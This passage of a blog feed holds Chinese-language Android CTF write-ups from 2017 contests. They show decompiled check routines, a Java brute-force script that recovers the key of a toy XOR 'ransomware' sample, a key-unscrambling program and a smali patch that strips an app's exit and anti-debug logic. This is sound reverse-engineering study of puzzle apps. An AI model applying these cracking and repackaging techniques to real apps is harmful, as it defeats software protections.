		    0x67, 0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 
		    0x77, 0x78, 0x79, 0x7A, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x5C, 0x27, 
		    0x3B, 0x00
		};
	
	private static int GetCharIndex(byte ch) {
		for(int i = 0; i &amp;lt; Base64Table.length; i++) {
			if (ch == Base64Table[i]) {
				return i;
			}
		}
		return -1;
	}
	
	public static void main(String[] args) throws Exception {
		int len = dataEncoded.length * 3 / 4;
		byte[] dataDecoded = new byte[len];
		int j = 0;
		for(int i = 0; i &amp;lt; dataEncoded.length; i += 4) {
			dataDecoded[j++] = (byte)((GetCharIndex((byte)(dataEncoded[i] ^ 0x3F)) &amp;lt;&amp;lt; 2) + ((GetCharIndex((byte)(dataEncoded[i + 1] ^ 0x0F)) &amp;gt;&amp;gt; 4) &amp;amp; 0x03));
			dataDecoded[j++] = (byte)(((GetCharIndex((byte)(dataEncoded[i + 1] ^ 0x0F)) &amp;amp; 0x0F) &amp;lt;&amp;lt; 4) + ((GetCharIndex(dataEncoded[i + 2]) &amp;gt;&amp;gt; 2) &amp;amp; 0x0F));
			dataDecoded[j++] = (byte)((GetCharIndex(dataEncoded[i + 2]) &amp;lt;&amp;lt; 6) + (GetCharIndex(dataEncoded[i + 3])));
		}
		System.out.println(new String(dataDecoded));
	}
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;因为上一题的套路，我猜后面那个32位字符串就是应该用来解密的数据，所以直接拿来测试&lt;/p&gt;

&lt;p&gt;输出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;VVe1lD0ne^-^
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;为了确定整个流程，再次回到Java层进行流程的分析&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DecryptUtils.checkRegCode(DecryptUtils.extensionTo32(JniTest.getValue(strInput.getBytes(&quot;utf-8&quot;))), &quot;01635e6c5f2378255f27356c11663165&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;首先是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DecryptUtils.extensionTo32()&lt;/code&gt;，用于将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;byte[]&lt;/code&gt;转为32位字符串&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public static String extensionTo32(byte[] Data) {
    StringBuilder stringBuilder = new StringBuilder();
    int lenOfData = Data.length;
    int i;
    for(i = 0; i &amp;lt; lenOfData; ++i) {
        stringBuilder.append(String.format(&quot;%02x&quot;, Integer.valueOf(Data[i] &amp;amp; 255)));
    }

    return stringBuilder.toString();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最终的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DecryptUtils.checkRegCode()&lt;/code&gt;很有意思，一不小心就会被带到坑里去&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public static boolean checkRegCode(String strCalcu, String strJUDGE) {
    boolean boolResult = false;
    try {
        String v4 = DecryptUtils.CTF1(DecryptUtils.Encrypt_MD5(strCalcu), strCalcu);
        String v5 = DecryptUtils.CTF1(DecryptUtils.Encrypt_MD5(strJUDGE), strJUDGE);
        if(v4.length() &amp;lt; v5.length()) {
            return boolResult;
        }

        int i = 0;
        int j = 0;
        while(i &amp;lt; v4.length()) {
            int temp = (v5.charAt(i) ^ v4.charAt(i)) + i ^ i;
            j += temp;
            while(temp &amp;gt; 0) {
                j += v5.charAt(temp) + v4.charAt(temp);
                --temp;
            }

            ++i;
        }

        boolResult = DecryptUtils.Encrypt_MD5(String.valueOf(j)).equals(&quot;cfcd208495d565ef66e7dff9f98764da&quot;);
    }
    catch(Exception v1) {
        v1.printStackTrace();
    }

    return boolResult;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果反推，马上就可以得到答案，如果正向走下来。。。。。。&lt;/p&gt;

&lt;p&gt;我们正向走一遍，首先是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CTF1()&lt;/code&gt;，将每个字符拆成2个4位，然后再挑数据拼接&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F1A9F28160078AC9A0C8407E6661DE2D.png&quot; alt=&quot;9.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;接下来进行对比计算&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int i = 0;
int j = 0;
while(i &amp;lt; v4.length()) {
    int temp = (v5.charAt(i) ^ v4.charAt(i)) + i ^ i;
    j += temp;
    while(temp &amp;gt; 0) {
        j += v5.charAt(temp) + v4.charAt(temp);
        --temp;
    }

    ++i;
}
boolResult = DecryptUtils.Encrypt_MD5(String.valueOf(j)).equals(&quot;cfcd208495d565ef66e7dff9f98764da&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;看着乱。。。。。。&lt;/p&gt;

&lt;p&gt;计算完后有一个MD5值的对比，尝试解密这个MD5&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;您查询的字符串是“cfcd208495d565ef66e7dff9f98764da”,解密的结果为“0”!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;。。。。。。&lt;/p&gt;

&lt;p&gt;那么说明计算完&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;j&lt;/code&gt;是0&lt;/p&gt;

&lt;p&gt;回头看计算过程，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;j&lt;/code&gt;一直是相加的计算，想让&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;j&lt;/code&gt;是0，那么在异或的时候两个值一定要相等，说明两个字符串相等，回溯到最前面，说明传进来的两个字符串相等，那么直接拿上面的32位字符串去解密，就可以得到正确的输入数据，输入那个数据，就可以弹出Flag&lt;/p&gt;

&lt;p&gt;输入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VVe1lD0ne^-^&lt;/code&gt;，弹出Flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/AF0853C2410C0B13F6F063867C32CC77.jpg&quot; alt=&quot;10.jpg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再次感谢沐师傅在赛后提供题目&lt;/p&gt;
</description>
                <pubDate>Wed, 10 May 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/05/10/2017-SSCTF-Login-200.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/05/10/2017-SSCTF-Login-200.html</guid>
            </item>
        
            <item>
                <title>2017 SSCTF - 加密勒索软件-100</title>
                <description>&lt;p&gt;感谢沐师傅在赛后提供题目&lt;/p&gt;

&lt;p&gt;压缩包内有一个Excel表格文件，打开显示损坏，猜测可能加密了，JEB载入APK样本，发现仅仅是Java层做处理，第一次打开应用的时候，会读取&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Sharedpreferences&lt;/code&gt;文件的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isEncryptrd&lt;/code&gt;字段，第一次读取该字段，该字段为0，所以会要求用户输入6位数字作为密码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/12894E2A8AB2A0AAD1D51906E1D52DBE.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在输入密码后，除了把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isEncrypted&lt;/code&gt;改为1之外，就没有其它的操作了&lt;/p&gt;

&lt;p&gt;当第二次输入密码，会调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check2()&lt;/code&gt;进行处理&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Main.this.check2(Main.this.flagView.getText().toString())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check2()&lt;/code&gt;函数在判断密码是否为空以及长度是否为6之后，调用了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;verify2()&lt;/code&gt;函数&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;private boolean check2(String arg5) {
    boolean v0 = false;
    if(arg5 == null || (arg5.isEmpty()) || arg5.length() != 6) {
        Toast.makeText(((Context)this), 2131034115, 0).show();
    }
    else {
        this.getSign(((Context)this));
        v0 = this.verify2(this.getSign(((Context)this)), this.SIGN_MD5);
    }

    return v0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;verify2()&lt;/code&gt;函数有两个参数，第一个参数通过函数调用的返回值来确定&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;private String getSign(Context arg2) {
    return ToolsUtils.getSignInfo(arg2, &quot;com.seclover.ctf1&quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ToolsUtils.getSignInfo()&lt;/code&gt;获取该应用签名的32位MD5值&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public static String getSignInfo(Context arg3, String arg4) {
    String v1;
    try {
        v1 = ToolsUtils.md5(Integer.toString(arg3.getPackageManager().getPackageInfo(arg4, 64).signatures[0].hashCode(), 16));
    }
    catch(Exception v0) {
        v0.printStackTrace();
        v1 = &quot;invalid&quot;;
    }

    return v1;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;verify2()&lt;/code&gt;函数第二个参数是一个写死的MD5值&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;this.SIGN_MD5 = &quot;a056d5ab1fa5c250c293a5b7588d0749&quot;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;verify2()&lt;/code&gt;函数的校验过程看上去比较复杂&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;private boolean verify2(String arg11, String arg12) {
    boolean v6 = false;
    byte[] v3 = ToolsUtils.SHA(arg11).getBytes();
    byte[] v4 = ToolsUtils.SHA(arg12).getBytes();
    int v0;
    for(v0 = 0; v0 &amp;lt; v3.length; ++v0) {
        int v2;
        for(v2 = 0; v2 &amp;lt; v4.length; ++v2) {
            v3[(v0 * v2 * 7 + 9) % v3.length] = ((byte)((v3[v0] ^ v2 * 5) % 127));
            v4[(v0 * v2 * 7 + 9) % v4.length] = ((byte)((v4[v0] ^ v2 * 5) % 127));
        }
    }

    int v1 = 0;
    int v5 = v3.length &amp;gt; v4.length ? v4.length : v3.length;
    v0 = 0;
    while(v0 &amp;lt; v5) {
        if((v3[v0] ^ v4[v0] ^ v3[v0]) != v3[v0]) {
            v1 = 1;
        }
        else {
            ++v0;
            continue;
        }

        break;
    }

    if(v1 == 0) {
        v6 = true;
    }

    return v6;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在这里纠结了一会儿，感觉乱糟糟的&lt;/p&gt;

&lt;p&gt;后来实现想不下去了，于是决定看一下后面的代码，发现了这是一个坑&lt;/p&gt;

&lt;p&gt;在前面的代码中，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check2()&lt;/code&gt;调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;verify2()&lt;/code&gt;，但是在校验通过后，并没有对Excel表格文件的解密处理等操作，也没有读取文件相关的代码&lt;/p&gt;

&lt;p&gt;这就尴尬了。。。。。。&lt;/p&gt;

&lt;p&gt;在上下翻看代码的过程中，发现有读取文件的操作函数，通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;k1&lt;/code&gt;数组跟&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctf1_encode.xlsx&lt;/code&gt;进行异或，相隔&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;256&lt;/code&gt;个字节异或一次&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;private boolean encode(Context arg12) {
    boolean v7 = false;
    File v2 = new File(Environment.getExternalStorageDirectory(), &quot;ctf1.xlsx&quot;);
    if(v2.exists()) {
        try {
            FileOutputStream v5 = new FileOutputStream(new File(Environment.getExternalStorageDirectory(), &quot;ctf1_encode.xlsx&quot;));
            FileInputStream v4 = new FileInputStream(v2);
            byte[] v0 = new byte[v4.available()];
            v4.read(v0);
            int v6;
            for(v6 = 0; v6 &amp;lt; v0.length; v6 += 256) {
                v0[v6] = ((byte)(v0[v6] ^ this.k1[v6 % this.k1.length]));
            }

            v5.write(v0);
            v5.close();
            v4.close();
            v2.delete();
            return true;
        }
        catch(Exception v1) {
            goto label_40;
        }
    }

    return v7;
label_40:
    v1.printStackTrace();
    return true;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;找到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;k1&lt;/code&gt;的定义，并没有进行初始化&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;private byte[] k1;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;发现&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;k1&lt;/code&gt;的初始化是在一个函数里进行的，这里的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;arg11&lt;/code&gt;应该就是输入的6位密码&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;private boolean check(String arg11) {
    int v9 = 100;
    boolean v2 = false;
    if(this.verify(this.getSign(((Context)this)), this.SIGN_MD5)) {
        int v0;
        for(v0 = 0; v0 &amp;lt; v9; ++v0) {
            int v1;
            for(v1 = 0; v1 &amp;lt; v9; ++v1) {
                this.k1[(v0 + 17) * (v1 + 5) % this.k1.length] = ((byte)((this.k1[v0 * v1 % this.k1.length] ^ arg11.charAt(v0 * v1 % arg11.length()) * 7) % 127));
            }
        }

        this.encode(((Context)this));
        v2 = true;
    }

    return v2;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;6位的数字，爆破一下应该是可以的。。。。。。&lt;/p&gt;

&lt;p&gt;应该是。。。。。。可以。。。。。。的。。。。。。&lt;/p&gt;

&lt;p&gt;6位数爆破出来的样本仿佛有点多。。。。。。&lt;/p&gt;

&lt;p&gt;有点。。。。。。多。。。。。。&lt;/p&gt;

&lt;p&gt;研究一下文件格式，看一下有没有固定的数据可以直接确定&lt;/p&gt;

&lt;p&gt;确定的位置为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x00&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x100&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x200&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x300&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400&lt;/code&gt;，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x500&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;首先是Magic Number，然后中间一片&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;00&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/4FD16F618454191B6845249B797D6A98.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再查看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctf1_encode.xlsx&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/204AA8561837F452CA7EACBD66D2662D.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;那么就可以确定前三个数字了&lt;/p&gt;

&lt;p&gt;再往下翻，发现两处&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A4291446561C74FC79ECE894955A85FD.png&quot; alt=&quot;4.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;正常的Excel是空的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/FF69AA52277609F2E6E1B317392DE4CE.png&quot; alt=&quot;5.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;现在可以大概的确定出来的数据&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x00  : y : 0x37
0x100 : y : 0x57
0x200 : y : 0x28
0x300 : ? : ?
0x400 : y : 0x75
0x500 : y : 0x67
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;接下来计算一下，强行写的很渣的代码，获取签名MD5这一步可以直接使用代码里的MD5值，反正是一样的，然后生成&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;k1&lt;/code&gt;数组，接下来进行计算，判断五个已确定的数据，因为是异或计算，可以再次异或，只要还原为正常Excel的数据即可&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.security.MessageDigest;

public class MyClass {

	static byte[] k1;
	static String MD5_KEY = &quot;a056d5ab1fa5c250c293a5b7588d0749&quot;;
	
	public static void main(String[] args) throws Exception {
		for(int i = 100000; i &amp;lt; 999999; i++) {
			verify(MD5_KEY);
			//printByteHex(k1);
			if(check(String.valueOf(i), i)) {
				System.out.println(&quot;Find it : ctf1_decode_&quot; + i + &quot;.xlsx&quot;);
			}
		}
	}
	
	private static void printByteHex(byte[] Data) {
		int len = Data.length;
		for (int i = 0; i &amp;lt; len; i++) {
			String temp = Integer.toHexString(Data[i] &amp;amp; 0xFF);
			if (temp.length() == 1) {
				temp = &quot;0&quot; + temp;
			}
			System.out.print(&quot;, 0x&quot; + temp);
		}
		System.out.println(&quot;&quot;);
	}
	
	private static void verify(String key) {
        k1 = SHA(key).getBytes();
        for(int i = 0; i &amp;lt; k1.length; i++) {
            for(int j = 0; j &amp;lt; k1.length; j++) {
                k1[(i * j * 7 + 9) % k1.length] = ((byte)((k1[i] ^ j * 5) % 127));
            }
        }
    }
	
	private static String SHA(String decript) {
        int i = 0;
        try {
            MessageDigest messageDigest = MessageDigest.getInstance(&quot;SHA&quot;);
            messageDigest.update(decript.getBytes(&quot;utf-8&quot;));
            byte[] sourceData = messageDigest.digest();
            StringBuffer stringBuffer = new StringBuffer();
            int len = sourceData.length;
            while(i &amp;lt; len) {
                String temp = Integer.toHexString(sourceData[i] &amp;amp; 0xFF);
                if(temp.length() &amp;lt; 2) {
                    stringBuffer.append(0);
                }
                stringBuffer.append(temp);
                ++i;
            }
            String result = stringBuffer.toString();
            return result;
        }
        catch(Exception v2) {
            v2.printStackTrace();
            return &quot;&quot;;
        }
    }
	
	private static boolean check(String key, int index) {
        for(int i = 0; i &amp;lt; 100; i++) {
            for(int j = 0; j &amp;lt; 100; j++) {
                k1[(i + 17) * (j + 5) % k1.length] = ((byte)((k1[i * j % k1.length] ^ key.charAt(i * j % key.length()) * 7) % 127));
            }
        }
        if(MyClass.encode(k1, index)) {
        	return true;
        }
        return false;
    }
	
	private static boolean encode(byte[] key, int index) {
        try {
        	//printByteHex(key);
            File file = new File(&quot;ctf1_encode.xlsx&quot;);
            if (!file.exists()) {
            	System.out.println(&quot;ctf1_encode.xlsx does not exist&quot;);
        		return false;
            }
            FileInputStream fileInputStream = new FileInputStream(file);
            byte[] temp = new byte[fileInputStream.available()];
            fileInputStream.read(temp);
            for(int i = 0; i &amp;lt; temp.length; i += 256) {
                temp[i] = ((byte)(temp[i] ^ key[i % key.length]));
            }
            if ((temp[0x00] != 'P') || (temp[0x100] != 0x00) || (temp[0x200] != 0x00) || (temp[0x400] != 0x00) || (temp[0x500] != 0x00)) {
	            fileInputStream.close();
				return false;
			}
            File output = new File(&quot;ctf1_decode_&quot; + index + &quot;.xlsx&quot;);
        	FileOutputStream fileOutputStream = new FileOutputStream(output);
            fileOutputStream.write(temp);
            fileOutputStream.close();
            fileInputStream.close();
        }
        catch(Exception e) {
            e.printStackTrace();
        }
        return true;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;最后输出&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Find it : ctf1_decode_111355.xlsx
Find it : ctf1_decode_112355.xlsx
Find it : ctf1_decode_121359.xlsx
Find it : ctf1_decode_125352.xlsx
Find it : ctf1_decode_151359.xlsx
Find it : ctf1_decode_155352.xlsx
Find it : ctf1_decode_159357.xlsx
Find it : ctf1_decode_162357.xlsx
Find it : ctf1_decode_179351.xlsx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;同时生成9个文件，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctf1_decode_111355.xlsx&lt;/code&gt;开始9个文件都是可以打开的&lt;/p&gt;

&lt;p&gt;打开后有一张图片&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/8E2F4EC63BA1CFC4711F8AAE61FA1D7C.png&quot; alt=&quot;6.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Flag : SSCTF{G0odJo13!}&lt;/p&gt;

&lt;p&gt;这题不知道是不是因为巧合，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x400&lt;/code&gt;的位置不知道是不是凑巧没有破坏文件格式，所以都能打开&lt;/p&gt;
</description>
                <pubDate>Tue, 09 May 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/05/09/2017-SSCTF-%E5%8A%A0%E5%AF%86%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6-100.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/05/09/2017-SSCTF-%E5%8A%A0%E5%AF%86%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6-100.html</guid>
            </item>
        
            <item>
                <title>2017 陕西省网络安全大赛 - 拯救鲁班七号-100</title>
                <description>&lt;p&gt;这代码乱的。。。。。。&lt;/p&gt;

&lt;p&gt;纯靠猜，就是下标的问题控制一下就好&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/B7E344E91EE913621532AD37D1539F16.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;写代码还原，如果逻辑还原不了，可以根据给的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;t&lt;/code&gt;数组手动算&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstdio&amp;gt;
#include &amp;lt;cstring&amp;gt;
using namespace std;

int main()
{
	char temp;
	char Key[] = &quot;S!@#@1FD23154A34&quot;;
	int len = strlen(Key);
	for (int i = len - 3; i - 2 &amp;gt;= -1; i -= 2)
	{
		for (int j = len - 4; j - 4 &amp;gt;= -3; j -= 4)
		{
			temp = Key[j];
			Key[j] = Key[j - 4];
			Key[j - 4] = temp;
		}
		temp = Key[i];
		Key[i] = Key[i - 1];
		Key[i - 1] = temp;
	}
	printf(&quot;%s\n&quot;, Key);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;结果：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!@#@ASDF34511234
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;中间有个反调试，不过我纯静态分析也没有过多的注意它，只是无意中看了一眼，大概是TracerPid字段检测&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/90C2DB45349DEA35B1954154E2ED2185.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最开始在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.init_array&lt;/code&gt;段进行调用&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/3338DAFAEB31C2972A7334510F3D1E68.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;
</description>
                <pubDate>Mon, 01 May 2017 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/android_ctf/2017/05/01/2017-%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-%E6%8B%AF%E6%95%91%E9%B2%81%E7%8F%AD%E4%B8%83%E5%8F%B7-100.html</link>
                <guid isPermaLink="true">http://localhost:4000/android_ctf/2017/05/01/2017-%E9%99%95%E8%A5%BF%E7%9C%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-%E6%8B%AF%E6%95%91%E9%B2%81%E7%8F%AD%E4%B8%83%E5%8F%B7-100.html</guid>
            </item>
        
            <item>
                <title>2017 陕西省网络安全大赛 - 取证密码-200</title>
                <description>&lt;p&gt;这题可以秒掉&lt;/p&gt;

&lt;p&gt;一进来就看到这个，这代码写的很渣，不想看逻辑，跳过看后面的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/FAB265FC24393676DE9844B67B17CBF5.png&quot; alt=&quot;1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onCreate()&lt;/code&gt;函数里发现有一个结束主Activity的操作，直接去掉&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/C48A69A1153DBE57AA57FA87F86BD11A.png&quot; alt=&quot;2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;使用AndroidKiller修改代码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6805F978DE86D1F3B27593D85034F6D1.png&quot; alt=&quot;3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;把&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run()&lt;/code&gt;的逻辑全去掉&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# virtual methods
.method public run()V
    .locals 0

    .prologue
    return-void
.end method
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;编译安装，可以正常运行&lt;/p&gt;

&lt;p&gt;然后分析下面的点击事件，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetString.encrypt()&lt;/code&gt;函数是native函数&lt;/p&gt;
